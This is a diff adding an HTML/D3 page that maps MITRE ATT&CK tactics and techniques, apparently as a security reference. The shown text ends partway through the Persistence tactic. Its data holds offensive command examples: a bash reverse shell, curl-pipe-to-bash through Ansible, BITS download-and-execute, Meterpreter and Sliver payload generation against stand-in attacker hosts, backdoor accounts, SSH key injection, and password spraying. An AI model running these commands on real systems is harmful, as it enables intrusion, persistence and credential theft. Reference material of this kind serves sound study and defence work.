@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MITRE ATT·CK v18.1 — Full Radial Map</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+:root{--bg:#03050f;--bg2:#060c1a;--panel:rgba(4,10,28,.97);--glow:#00c8ff;--grid:rgba(0,200,255,.035)}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);font-family:'Rajdhani',sans-serif;color:#c8d8f0;overflow:hidden;width:100vw;height:100vh;cursor:crosshair}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px);pointer-events:none;z-index:1000}
+#grid{position:fixed;inset:0;z-index:0;background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);background-size:40px 40px}
+#canvas{position:relative;z-index:2;width:100vw;height:100vh}
+svg{width:100%;height:100%}
+.link{fill:none;stroke-width:1;opacity:.3}
+.node{cursor:pointer}
+.node circle{transition:r .18s,filter .18s}
+.node:hover circle{filter:brightness(1.6)!important}
+.node text{pointer-events:none;paint-order:stroke fill}
+
+/* ── Tooltip ── */
+#tt{position:fixed;top:50%;right:1.5%;transform:translateY(-50%);width:400px;background:var(--panel);border:1px solid rgba(0,200,255,.22);border-left:3px solid var(--glow);display:none;z-index:100;box-shadow:0 0 50px rgba(0,200,255,.07);backdrop-filter:blur(10px);max-height:90vh;overflow-y:auto;border-radius:2px}
+#tt::-webkit-scrollbar{width:4px}
+#tt::-webkit-scrollbar-thumb{background:rgba(0,200,255,.28);border-radius:2px}
+#tth{padding:13px 16px 9px;border-bottom:1px solid rgba(0,200,255,.13);position:sticky;top:0;background:rgba(2,6,18,.98);z-index:2}
+#ttid{font-family:'Share Tech Mono',monospace;font-size:10px;color:rgba(0,200,255,.6);letter-spacing:2px;margin-bottom:2px}
+#tttitle{font-family:'Orbitron',monospace;font-size:13px;font-weight:700;color:#fff;letter-spacing:.5px;line-height:1.3}
+#ttb{padding:12px 16px}
+.ts{margin-bottom:12px}
+.tl{font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:3px;color:rgba(0,200,255,.5);margin-bottom:5px}
+.td{font-size:12.5px;color:#a8bcd8;line-height:1.55}
+.tc{font-family:'Share Tech Mono',monospace;font-size:10.5px;color:#5effa0;background:rgba(0,255,100,.04);border:1px solid rgba(0,255,100,.13);padding:7px 9px;margin-bottom:4px;line-height:1.5;word-break:break-all;border-radius:2px}
+.tn{font-size:11.5px;color:#7090b0;margin-top:2px;padding-left:8px;border-left:2px solid rgba(0,200,255,.18);line-height:1.4}
+.tsub{padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);display:flex;align-items:baseline;gap:8px}
+.tsub-id{font-family:'Share Tech Mono',monospace;font-size:9.5px;flex-shrink:0}
+.tsub-name{font-size:12px;color:#c0d0e8}
+.mit{font-size:11.5px;color:#8098b8;padding:3px 0 3px 9px;border-left:2px solid rgba(255,180,0,.32);margin-bottom:3px}
+.ttclose{position:absolute;top:9px;right:12px;background:none;border:none;color:rgba(0,200,255,.5);font-family:'Share Tech Mono',monospace;font-size:13px;cursor:pointer;transition:color .2s;z-index:3}
+.ttclose:hover{color:#fff}
+
+/* ── HUD ── */
+#hud{position:fixed;top:18px;left:50%;transform:translateX(-50%);text-align:center;z-index:50;pointer-events:none}
+#htitle{font-family:'Orbitron',monospace;font-size:19px;font-weight:900;color:#fff;letter-spacing:5px;text-shadow:0 0 28px rgba(0,200,255,.55)}
+#hsub{font-family:'Share Tech Mono',monospace;font-size:10px;color:rgba(0,200,255,.5);letter-spacing:3px;margin-top:3px}
+
+/* ── Controls ── */
+#ctrl{position:fixed;top:78px;left:18px;z-index:50;display:flex;flex-direction:column;gap:7px}
+.cb{font-family:'Share Tech Mono',monospace;font-size:10px;color:rgba(0,200,255,.7);background:rgba(3,8,22,.88);border:1px solid rgba(0,200,255,.18);padding:6px 11px;cursor:pointer;letter-spacing:1px;transition:all .18s;text-align:left}
+.cb:hover{background:rgba(0,200,255,.1);color:#fff;border-color:rgba(0,200,255,.5)}
+
+/* ── Stats ── */
+#stats{position:fixed;top:78px;right:18px;z-index:50;font-family:'Share Tech Mono',monospace;font-size:10px;color:rgba(0,200,255,.38);text-align:right;letter-spacing:1px;line-height:1.9;pointer-events:none}
+
+/* ── Legend ── */
+#leg{position:fixed;bottom:14px;left:50%;transform:translateX(-50%);display:flex;gap:14px;flex-wrap:wrap;justify-content:center;z-index:50;background:rgba(2,6,18,.78);padding:7px 18px;border:1px solid rgba(0,200,255,.1);border-radius:2px;backdrop-filter:blur(5px)}
+.li{display:flex;align-items:center;gap:5px;font-family:'Share Tech Mono',monospace;font-size:9px;color:rgba(200,216,240,.7);cursor:pointer;transition:opacity .18s}
+.li:hover{opacity:1!important}
+.ld{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+
+/* ── Search ── */
+#search-wrap{position:fixed;top:78px;left:50%;transform:translateX(-50%);z-index:50}
+#search{background:rgba(3,8,22,.9);border:1px solid rgba(0,200,255,.2);color:#c8d8f0;font-family:'Share Tech Mono',monospace;font-size:11px;padding:6px 12px;width:260px;outline:none;letter-spacing:1px}
+#search::placeholder{color:rgba(0,200,255,.3)}
+#search:focus{border-color:rgba(0,200,255,.5)}
+</style>
+</head>
+<body>
+<div id="grid"></div>
+<div id="hud">
+  <div id="htitle">MITRE ATT·CK v18.1</div>
+  <div id="hsub">ENTERPRISE · 14 TACTICS · 216 TECHNIQUES · 475 SUB-TECHNIQUES · CLICK TO INSPECT</div>
+</div>
+<div id="ctrl">
+  <button class="cb" onclick="resetZoom()">⊕ RESET</button>
+  <button class="cb" onclick="zoomTo(.45)">◈ OVERVIEW</button>
+  <button class="cb" onclick="zoomTo(1.2)">◉ DETAIL</button>
+</div>
+<div id="search-wrap"><input id="search" placeholder="Search technique / TID..." oninput="doSearch(this.value)"></div>
+<div id="stats">
+  <div>TACTICS <span id="ct">14</span></div>
+  <div>TECHNIQUES <span id="cte">216</span></div>
+  <div>SUB-TECH <span id="cs">475</span></div>
+</div>
+<div id="canvas"><svg id="svg"></svg></div>
+<div id="tt">
+  <div id="tth">
+    <button class="ttclose" onclick="closeTT()">✕</button>
+    <div id="ttid"></div>
+    <div id="tttitle"></div>
+  </div>
+  <div id="ttb"></div>
+</div>
+<div id="leg"></div>
+
+<script>
+/**
+ * ════════════════════════════════════════════════════════════════════
+ * MITRE ATT·CK v18.1 Enterprise Radial Mindmap — Single File Version
+ * ════════════════════════════════════════════════════════════════════
+ *
+ * CLAUDE CODE QUICK REFERENCE
+ * ─────────────────────────────
+ * Section markers (Ctrl+F to jump):
+ *   "SECTION: DATA"      — all ATT&CK content (tactics, techniques, sub-tech, commands)
+ *   "SECTION: D3 RENDERER" — radial tree layout algorithm
+ *   "SECTION: TOOLTIP"   — click panel content & logic
+ *   "SECTION: SEARCH"    — search/filter logic
+ *   "SECTION: CONTROLS"  — zoom buttons
+ *   "SECTION: LEGEND"    — bottom legend
+ *
+ * Common tasks:
+ *   Add technique     → find tactic in DATA[], append to techs[]
+ *   Change colors     → edit color: "#hex" in tactic object OR --glow in :root CSS
+ *   Add command       → find technique, append to cmds: [{c:"cmd",n:"note"}]
+ *   Change layout     → find d3.tree().size([...]) and adjust multiplier
+ *   Export data       → console: copy(JSON.stringify(DATA))
+ *   Flat CSV export   → console: copy(toFlatList().map(r=>Object.values(r).join(',')).join('\n'))
+ */
+
+// ════════════════════════════════════════════════════════════════════════════
+// ═══ SECTION: DATA ════════════════════════════════════════════════════════════
+// Edit this section to add/modify tactics, techniques, sub-techniques, commands
+// Schema: DATA[]{id,name,color,desc,techs[]{id,name,desc,sub[]{id,name},cmds[]{c,n}}}
+//
+// MITRE ATT&CK v18.1 — FULL ENTERPRISE DATA
+// Source: https://attack.mitre.org  (verified April 2025)
+// 14 Tactics | 216 Techniques | 475 Sub-techniques
+// ════════════════════════════════════════════════════════════════════════════
+const DATA = [
+ {id:"TA0043",name:"Reconnaissance",color:"#ff4d6d",desc:"Gather info to plan future operations.",
+  techs:[
+   {id:"T1595",name:"Active Scanning",desc:"Probe victim infrastructure via network traffic.",
+    sub:[{id:".001",name:"Scanning IP Blocks"},{id:".002",name:"Vulnerability Scanning"},{id:".003",name:"Wordlist Scanning"}],
+    cmds:[{c:"nmap -sV -sC -p- --open -T4 192.168.1.0/24",n:"Full TCP with service detection"},{c:"masscan -p1-65535 10.0.0.0/8 --rate=10000",n:"High-speed scan"},{c:"nuclei -l targets.txt -t cves/ -severity critical,high",n:"CVE template scanner"}]},
+   {id:"T1592",name:"Gather Victim Host Info",desc:"Info about victim hosts: config, firmware, software.",
+    sub:[{id:".001",name:"Hardware"},{id:".002",name:"Software"},{id:".003",name:"Firmware"},{id:".004",name:"Client Configurations"}],
+    cmds:[{c:"shodan host <IP>",n:"Full host details from Shodan"},{c:"nmap -sV --script banner 10.0.0.1",n:"Banner grabbing"}]},
+   {id:"T1589",name:"Gather Victim Identity Info",desc:"Employee names, emails, credentials.",
+    sub:[{id:".001",name:"Credentials"},{id:".002",name:"Email Addresses"},{id:".003",name:"Employee Names"}],
+    cmds:[{c:"theHarvester -d target.com -b all",n:"OSINT email/name harvest"},{c:"h8mail -t emails.txt",n:"Breach data lookup"}]},
+   {id:"T1590",name:"Gather Victim Network Info",desc:"IP ranges, domain names, DNS, topology.",
+    sub:[{id:".001",name:"Domain Properties"},{id:".002",name:"DNS"},{id:".003",name:"Network Trust Dependencies"},{id:".004",name:"Network Topology"},{id:".005",name:"IP Addresses"},{id:".006",name:"Network Security Appliances"}],
+    cmds:[{c:"amass enum -d target.com -passive",n:"Passive subdomain enum"},{c:"dnsx -l domains.txt -a -cname -resp",n:"DNS resolution bulk"}]},
+   {id:"T1591",name:"Gather Victim Org Info",desc:"Business processes, org structure, physical locations.",
+    sub:[{id:".001",name:"Determine Physical Locations"},{id:".002",name:"Business Relationships"},{id:".003",name:"Identify Business Tempo"},{id:".004",name:"Identify Roles"}],
+    cmds:[{c:"linkedin2username -c 'Corp Name'",n:"Generate usernames from LinkedIn"},{c:"maltego → Footprint L2 transform",n:"Org graph via Maltego"}]},
+   {id:"T1593",name:"Search Open Websites/Domains",desc:"Social media, news, job sites for victim info.",
+    sub:[{id:".001",name:"Social Media"},{id:".002",name:"Search Engines"},{id:".003",name:"Code Repositories"}],
+    cmds:[{c:"google dork: site:target.com filetype:pdf",n:"Google dorking"},{c:"trufflehog github --repo https://github.com/corp/repo",n:"Leaked secrets in repos"}]},
+   {id:"T1594",name:"Search Victim-Owned Websites",desc:"Target's own website for employee info, services.",
+    sub:[],
+    cmds:[{c:"gospider -s https://target.com -d 3 -t 10",n:"Spider website for links/data"},{c:"hakrawler -url https://target.com -depth 3",n:"Fast web crawler"}]},
+   {id:"T1596",name:"Search Open Technical Databases",desc:"WHOIS, DNS, certificate logs, scan databases.",
+    sub:[{id:".001",name:"DNS/Passive DNS"},{id:".002",name:"WHOIS"},{id:".003",name:"Digital Certificates"},{id:".004",name:"CDNs"},{id:".005",name:"Scan Databases"}],
+    cmds:[{c:"crt.sh/?q=%.target.com",n:"Certificate transparency"},{c:"shodan search 'org:TargetCorp'",n:"Shodan org search"}]},
+   {id:"T1597",name:"Search Closed Sources",desc:"Dark web, threat intel feeds, purchased databases.",
+    sub:[{id:".001",name:"Threat Intel Vendors"},{id:".002",name:"Purchase Technical Data"}],
+    cmds:[{c:"# Dark web forums / Genesis Market",n:"Stolen credentials market"},{c:"# Recorded Future / Mandiant Intel API",n:"Commercial threat intel"}]},
+   {id:"T1598",name:"Phishing for Information",desc:"Phishing to elicit sensitive information.",
+    sub:[{id:".001",name:"Spearphishing Service"},{id:".002",name:"Spearphishing Attachment"},{id:".003",name:"Spearphishing Link"},{id:".004",name:"Spearphishing Voice"}],
+    cmds:[{c:"evilginx2 -p phishlets/  # Microsoft365 phishlet",n:"AiTM: steal session cookies bypassing MFA"},{c:"gophish → New Campaign → clone login page",n:"Credential harvesting"}]},
+  ]},
+
+ {id:"TA0042",name:"Resource Development",color:"#ff7c43",desc:"Establish resources to support operations.",
+  techs:[
+   {id:"T1650",name:"Acquire Access",desc:"Purchase or obtain access to target via initial access brokers.",
+    sub:[],cmds:[{c:"# Underground forums: Genesis, RussianMarket",n:"IAB access purchase"},{c:"# Cobalt Strike cracked/leaked versions",n:"Acquire cracked C2 frameworks"}]},
+   {id:"T1583",name:"Acquire Infrastructure",desc:"Buy/lease servers, domains, VPS.",
+    sub:[{id:".001",name:"Domains"},{id:".002",name:"DNS Server"},{id:".003",name:"Virtual Private Server"},{id:".004",name:"Server"},{id:".005",name:"Botnet"},{id:".006",name:"Web Services"},{id:".007",name:"Serverless"},{id:".008",name:"Malvertising"}],
+    cmds:[{c:"doctl compute droplet create c2 --image ubuntu-22-04-x64 --region fra1",n:"DigitalOcean VPS"},{c:"certbot certonly --standalone -d c2.attacker.com",n:"Free TLS cert"}]},
+   {id:"T1586",name:"Compromise Accounts",desc:"Compromise existing social media / email / cloud accounts.",
+    sub:[{id:".001",name:"Social Media Accounts"},{id:".002",name:"Email Accounts"},{id:".003",name:"Cloud Accounts"}],
+    cmds:[{c:"credentialphishing → steal OAuth token",n:"OAuth token theft"},{c:"password spray against O365",n:"Spray to compromise email"}]},
+   {id:"T1584",name:"Compromise Infrastructure",desc:"Compromise 3rd party servers, domains, devices.",
+    sub:[{id:".001",name:"Domains"},{id:".002",name:"DNS Server"},{id:".003",name:"Virtual Private Server"},{id:".004",name:"Server"},{id:".005",name:"Botnet"},{id:".006",name:"Web Services"},{id:".007",name:"Serverless"},{id:".008",name:"Network Devices"}],
+    cmds:[{c:"# Exploit vulnerable SOHO router for C2 relay",n:"Compromise 3rd party hop"},{c:"# Subdomain takeover via dangling CNAME",n:"Domain compromise"}]},
+   {id:"T1585",name:"Establish Accounts",desc:"Create social media, email, cloud accounts for ops.",
+    sub:[{id:".001",name:"Social Media Accounts"},{id:".002",name:"Email Accounts"},{id:".003",name:"Cloud Accounts"}],
+    cmds:[{c:"# Register Gmail / ProtonMail for ops",n:"Anonymous email account"},{c:"# Create LinkedIn persona for spearphishing",n:"Fake persona creation"}]},
+   {id:"T1587",name:"Develop Capabilities",desc:"Build malware, exploits, tools.",
+    sub:[{id:".001",name:"Malware"},{id:".002",name:"Code Signing Certificates"},{id:".003",name:"Digital Certificates"},{id:".004",name:"Exploits"}],
+    cmds:[{c:"msfvenom -p linux/x64/meterpreter/reverse_https LHOST=c2 LPORT=443 -f elf -o pl",n:"Generate Meterpreter payload"},{c:"sliver generate --mtls attacker.com --os linux --arch amd64",n:"Sliver C2 beacon"}]},
+   {id:"T1588",name:"Obtain Capabilities",desc:"Obtain tools, malware, exploits from external sources.",
+    sub:[{id:".001",name:"Malware"},{id:".002",name:"Tool"},{id:".003",name:"Code Signing Certificates"},{id:".004",name:"Digital Certificates"},{id:".005",name:"Exploits"},{id:".006",name:"Vulnerabilities"}],
+    cmds:[{c:"git clone https://github.com/BloodHoundAD/BloodHound",n:"AD attack path tool"},{c:"pip install impacket",n:"Impacket AD/SMB suite"}]},
+   {id:"T1608",name:"Stage Capabilities",desc:"Host tools/payloads on attacker infrastructure.",
+    sub:[{id:".001",name:"Upload Malware"},{id:".002",name:"Upload Tool"},{id:".003",name:"Install Digital Certificate"},{id:".004",name:"Drive-by Target"},{id:".005",name:"Link Target"},{id:".006",name:"SEO Poisoning"}],
+    cmds:[{c:"python3 -m http.server 8080  # host payloads",n:"Simple HTTP server for staging"},{c:"certbot certonly --standalone -d payload.attacker.com",n:"TLS for payload server"}]},
+  ]},
+
+ {id:"TA0001",name:"Initial Access",color:"#ffa600",desc:"Get into the target network.",
+  techs:[
+   {id:"T1189",name:"Drive-by Compromise",desc:"Exploit browser vuln when user visits malicious site.",
+    sub:[],cmds:[{c:"# BeEF: browser exploitation framework",n:"Hook browsers via XSS"},{c:"msfconsole> use exploit/windows/browser/ms14_064_ole_code_execution",n:"IE OLE exploit via drive-by"}]},
+   {id:"T1659",name:"Content Injection",desc:"Inject malicious content into online network traffic.",
+    sub:[],cmds:[{c:"# BGP hijack → inject content into transit traffic",n:"Nation-state level ISP injection"},{c:"# Compromise CDN to inject scripts",n:"CDN supply chain injection"}]},
+   {id:"T1190",name:"Exploit Public-Facing App",desc:"Exploit vulnerability in internet-facing application.",
+    sub:[],cmds:[{c:"sqlmap -u 'https://app.corp.com/api/?id=1' --batch --dbs",n:"Automated SQL injection"},{c:"nuclei -u https://app.corp.com -t cves/ -severity critical",n:"CVE template scan"},{c:"log4shell.py -u https://target.com --test  # CVE-2021-44228",n:"Log4Shell test"}]},
+   {id:"T1133",name:"External Remote Services",desc:"Leverage VPN, RDP, SSH, Citrix for access.",
+    sub:[],cmds:[{c:"xfreerdp /u:admin /p:'P@ss' /v:vpn.corp.com /cert-ignore",n:"External RDP"},{c:"ssh -i stolen_key deploy@bastion.corp.com",n:"SSH with stolen key"}]},
+   {id:"T1200",name:"Hardware Additions",desc:"Introduce rogue hardware: USB key, network implant.",
+    sub:[],cmds:[{c:"# USB Rubber Ducky → auto-types payload",n:"HID attack device"},{c:"# LAN Turtle → rogue network implant via RJ45",n:"Passive network tap"}]},
+   {id:"T1091",name:"Replication Through Removable Media",desc:"Spread via USB/removable media.",
+    sub:[],cmds:[{c:"# Autorun.inf on USB: crafted for Windows",n:"USB autorun attack"},{c:"cp implant.exe /media/usb/autorun.exe",n:"Copy payload to USB"}]},
+   {id:"T1195",name:"Supply Chain Compromise",desc:"Manipulate software/hardware supply chain.",
+    sub:[{id:".001",name:"Compromise Software Dependencies"},{id:".002",name:"Compromise Software Supply Chain"},{id:".003",name:"Compromise Hardware Supply Chain"}],
+    cmds:[{c:"# Typosquatting npm: publish 'lodahs' vs 'lodash'",n:"Malicious npm package"},{c:"# SolarWinds-style: tamper DLL in build pipeline",n:"Build pipeline compromise"}]},
+   {id:"T1199",name:"Trusted Relationship",desc:"Abuse access granted to 3rd party / partner.",
+    sub:[],cmds:[{c:"ssh -i vendor_key admin@internal.corp.com  # via MSP creds",n:"MSP/vendor key abuse"},{c:"# Compromise CI/CD credentials (Jenkins, GitLab)",n:"DevOps pipeline access"}]},
+   {id:"T1078",name:"Valid Accounts",desc:"Use legitimate credentials for access.",
+    sub:[{id:".001",name:"Default Accounts"},{id:".002",name:"Domain Accounts"},{id:".003",name:"Local Accounts"},{id:".004",name:"Cloud Accounts"}],
+    cmds:[{c:"hydra -L users.txt -P rockyou.txt ssh://target -t 4 -W 3",n:"SSH brute force"},{c:"crackmapexec smb 10.0.0.0/24 -u admin -p 'Summer2024!'",n:"SMB spray"},{c:"kerbrute passwordspray -d corp.local users.txt 'Welcome1'",n:"Kerberos spray (no 4625 events)"}]},
+   {id:"T1566",name:"Phishing",desc:"Spearphishing email with attachment, link, or service.",
+    sub:[{id:".001",name:"Spearphishing Attachment"},{id:".002",name:"Spearphishing Link"},{id:".003",name:"Spearphishing via Service"},{id:".004",name:"Spearphishing Voice"}],
+    cmds:[{c:"swaks --to cfo@corp.com --from it@corp.com --attach invoice.xlsm",n:"Send macro-enabled attachment"},{c:"evilginx2  # AiTM phishing bypassing MFA",n:"Session cookie theft"},{c:"msfvenom → malicious Word .docm with macro",n:"Office macro payload"}]},
+  ]},
+
+ {id:"TA0002",name:"Execution",color:"#f5e642",desc:"Run malicious code on target systems.",
+  techs:[
+   {id:"T1059",name:"Command and Scripting Interpreter",desc:"Abuse shells, scripting languages for execution.",
+    sub:[{id:".001",name:"PowerShell"},{id:".002",name:"AppleScript"},{id:".003",name:"Windows Command Shell"},{id:".004",name:"Unix Shell"},{id:".005",name:"Visual Basic"},{id:".006",name:"Python"},{id:".007",name:"JavaScript"},{id:".008",name:"Network Device CLI"},{id:".009",name:"Cloud API"},{id:".010",name:"AutoHotKey & AutoIT"},{id:".011",name:"Lua"},{id:".012",name:"Hypervisor CLI"},{id:".013",name:"Container CLI/API"}],
+    cmds:[{c:"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",n:"Bash reverse shell"},{c:"powershell -NoP -NonI -W Hidden -Exec Bypass -enc <b64>",n:"PowerShell bypass"},{c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",n:"PTY upgrade"}]},
+   {id:"T1609",name:"Container Administration Command",desc:"Abuse container admin APIs for execution.",
+    sub:[],cmds:[{c:"docker exec -it container bash",n:"Exec into running container"},{c:"kubectl exec -it pod-name -- sh",n:"K8s pod execution"}]},
+   {id:"T1651",name:"Cloud Administration Command",desc:"Abuse AWS SSM, Azure RunCommand for VM execution.",
+    sub:[],cmds:[{c:"aws ssm send-command --instance-ids i-xxx --document-name 'AWS-RunShellScript' --parameters commands=['id']",n:"AWS SSM command exec"}]},
+   {id:"T1610",name:"Deploy Container",desc:"Deploy a container to execute payload.",
+    sub:[],cmds:[{c:"docker run --rm -v /:/host alpine chroot /host sh",n:"Privileged container escape"},{c:"kubectl run pwn --image=alpine --restart=Never -- /bin/sh -c 'cat /host/etc/shadow'",n:"K8s privileged pod"}]},
+   {id:"T1203",name:"Exploitation for Client Execution",desc:"Exploit vulnerability in client application.",
+    sub:[],cmds:[{c:"msfconsole> use exploit/windows/fileformat/ms17_010  # EternalBlue doc",n:"Exploit triggered by opening file"},{c:"# Malicious PDF via Adobe Reader CVE",n:"PDF exploit"}]},
+   {id:"T1559",name:"Inter-Process Communication",desc:"Abuse IPC mechanisms: COM, DDE, XPC.",
+    sub:[{id:".001",name:"Component Object Model"},{id:".002",name:"Dynamic Data Exchange"},{id:".003",name:"XPC Services"}],
+    cmds:[{c:"# DDE in Word: =cmd|' /c calc.exe'!A1",n:"DDE formula injection"},{c:"# COM object instantiation for lateral movement",n:"COM-based execution"}]},
+   {id:"T1106",name:"Native API",desc:"Interact directly with OS APIs for execution.",
+    sub:[],cmds:[{c:"# CreateProcess, ShellExecute, NtCreateProcess via P/Invoke",n:"Win32 API direct call"},{c:"ctypes.CDLL(None).system('/bin/bash')  # Python ctypes",n:"Linux libc via Python"}]},
+   {id:"T1053",name:"Scheduled Task/Job",desc:"Schedule code to run at specific times.",
+    sub:[{id:".001",name:"At"},{id:".002",name:"At (Linux)"},{id:".003",name:"Cron"},{id:".004",name:"Launchd"},{id:".005",name:"Scheduled Task"},{id:".006",name:"Systemd Timers"},{id:".007",name:"Container Orchestration Job"}],
+    cmds:[{c:"(crontab -l; echo '*/5 * * * * /tmp/.beacon') | crontab -",n:"Add cron job"},{c:"schtasks /create /tn 'Update' /tr 'C:\\tmp\\pl.exe' /sc minute /mo 5",n:"Windows scheduled task"},{c:"systemd-run --on-calendar='*:0/5' /tmp/beacon",n:"Systemd timer"}]},
+   {id:"T1129",name:"Shared Modules",desc:"Execute code via shared modules / DLL loading.",
+    sub:[],cmds:[{c:"# DLL search order hijacking to load malicious DLL",n:"DLL load execution"}]},
+   {id:"T1072",name:"Software Deployment Tools",desc:"Abuse Ansible, SCCM, Puppet, Chef for exec.",
+    sub:[],cmds:[{c:"ansible -i inventory all -m shell -a 'curl http://10.0.0.1/pl|bash' -b",n:"Mass exec via Ansible"},{c:"crackmapexec smb 10.0.0.0/24 -u admin -p pass -x 'net user hacker /add'",n:"CME mass Windows exec"}]},
+   {id:"T1569",name:"System Services",desc:"Abuse system services for execution.",
+    sub:[{id:".001",name:"Launchctl"},{id:".002",name:"Service Execution"}],
+    cmds:[{c:"sc create evil binpath='cmd /c whoami > C:\\out.txt' && sc start evil",n:"Create+start service for exec"},{c:"psexec.exe \\\\target -u admin -p pass cmd.exe",n:"PsExec remote execution"}]},
+   {id:"T1204",name:"User Execution",desc:"User runs malicious file, link, or image.",
+    sub:[{id:".001",name:"Malicious Link"},{id:".002",name:"Malicious File"},{id:".003",name:"Malicious Image"}],
+    cmds:[{c:"msfvenom -p windows/x64/meterpreter/reverse_https -f exe -o payload.exe",n:"Executable payload for user execution"},{c:"# ISO file with LNK → bypasses Mark-of-the-Web",n:"ISO dropper technique"}]},
+   {id:"T1047",name:"Windows Management Instrumentation",desc:"Abuse WMI for execution.",
+    sub:[],cmds:[{c:"wmic /node:target /user:admin /password:pass process call create 'cmd.exe /c whoami'",n:"WMI remote process creation"},{c:"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe'",n:"PowerShell WMI exec"}]},
+   {id:"T1648",name:"Serverless Execution",desc:"Abuse serverless functions (Lambda, Cloud Functions) for execution.",
+    sub:[],cmds:[{c:"aws lambda invoke --function-name victim-func --payload '{\"cmd\":\"id\"}' out.json",n:"Lambda function invocation"},{c:"# Inject malicious code into Lambda via environment vars",n:"Lambda code injection"}]},
+  ]},
+
+ {id:"TA0003",name:"Persistence",color:"#7fff7f",desc:"Maintain foothold in target environment.",
+  techs:[
+   {id:"T1098",name:"Account Manipulation",desc:"Modify accounts to maintain access.",
+    sub:[{id:".001",name:"Additional Cloud Credentials"},{id:".002",name:"Additional Email Delegate Permissions"},{id:".003",name:"Additional Cloud Roles"},{id:".004",name:"SSH Authorized Keys"},{id:".005",name:"Device Registration"},{id:".006",name:"Additional Container Cluster Roles"},{id:".007",name:"Additional Local or Domain Groups"}],
+    cmds:[{c:"echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",n:"Inject SSH public key"},{c:"net user hacker P@ss123! /add && net localgroup Administrators hacker /add",n:"Windows admin account"}]},
+   {id:"T1197",name:"BITS Jobs",desc:"Abuse Windows BITS for persistent execution.",
+    sub:[],cmds:[{c:"bitsadmin /create /download /priority foreground job && bitsadmin /addfile job http://10.0.0.1/pl.exe C:\\tmp\\pl.exe && bitsadmin /resume job",n:"BITS download + execute"}]},
+   {id:"T1547",name:"Boot/Logon Autostart Execution",desc:"Run code at boot or logon via autostart mechanisms.",
+    sub:[{id:".001",name:"Registry Run Keys / Startup Folder"},{id:".002",name:"Authentication Package"},{id:".003",name:"Time Providers"},{id:".004",name:"Winlogon Helper DLL"},{id:".005",name:"Security Support Provider"},{id:".006",name:"Kernel Modules and Extensions"},{id:".007",name:"Re-opened Applications"},{id:".008",name:"LSASS Driver"},{id:".009",name:"Shortcut Modification"},{id:".010",name:"Port Monitors"},{id:".012",name:"Print Processors"},{id:".013",name:"XDG Autostart Entries"},{id:".014",name:"Active Setup"},{id:".015",name:"Login Items"}],
+    cmds:[{c:"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\tmp\\pl.exe",n:"Registry Run key persistence"},{c:"mkdir ~/.config/autostart && cp evil.desktop ~/.config/autostart/",n:"Linux XDG autostart"}]},
+   {id:"T1037",name:"Boot/Logon Initialization Scripts",desc:"Scripts auto-executed at boot/logon.",
+    sub:[{id:".001",name:"Logon Script (Windows)"},{id:".002",name:"Login Hook"},{id:".003",name:"Network Logon Script"},{id:".004",name:"RC Scripts"},{id:".005",name:"Startup Items"}],
+    cmds:[{c:"reg add 'HKCU\\Environment' /v UserInitMprLogonScript /t REG_SZ /d C:\\tmp\\pl.bat",n:"Windows logon script"},{c:"echo '/tmp/.beacon &' >> /etc/rc.local",n:"Linux RC script"}]},
+   {id:"T1176",name:"Browser Extensions",desc:"Malicious browser extensions for persistence.",
+    sub:[{id:".001",name:"Security Software Discovery through Extensions"},{id:".002",name:"Remote Access Capabilities"}],
+    cmds:[{c:"# Force-install Chrome extension via GPO",n:"Enterprise browser extension push"},{c:"# Malicious extension in chrome://extensions/ from .crx",n:"Sideloaded extension"}]},
+   {id:"T1554",name:"Compromise Host Software Binary",desc:"Modify host software binaries for persistence.",
+    sub:[],cmds:[{c:"# Patch /usr/bin/sudo to log passwords",n:"Binary trojanising"},{c:"# Replace SSH binary with backdoored version",n:"SSH binary modification"}]},
+   {id:"T1136",name:"Create Account",desc:"Create accounts to maintain access.",
+    sub:[{id:".001",name:"Local Account"},{id:".002",name:"Domain Account"},{id:".003",name:"Cloud Account"}],
+    cmds:[{c:"useradd -m -s /bin/bash -G sudo sysback && echo 'sysback:P@ss'|chpasswd",n:"Linux backdoor account"},{c:"New-ADUser -Name 'SvcBackup' -AccountPassword (ConvertTo-SecureString 'P@ss' -AsPlainText -Force) -Enabled $true",n:"AD user creation"}]},
+   {id:"T1543",name:"Create or Modify System Process",desc:"Create/modify systemd, launchd, Windows services.",
+    sub:[{id:".001",name:"Launch Agent"},{id:".002",name:"Systemd Service"},{id:".003",name:"Windows Service"},{id:".004",name:"Launch Daemon"},{id:".005",name:"Container Service"}],
+    cmds:[{c:"systemctl enable --now evil.service  # unit in /etc/systemd/system/",n:"Systemd service persistence"},{c:"sc create BackupSvc binpath='C:\\tmp\\pl.exe' start=auto && sc start BackupSvc",n:"Windows service"}]},
+   {id:"T1546",name:"Event Triggered Execution",desc:"Run code based on system events.",
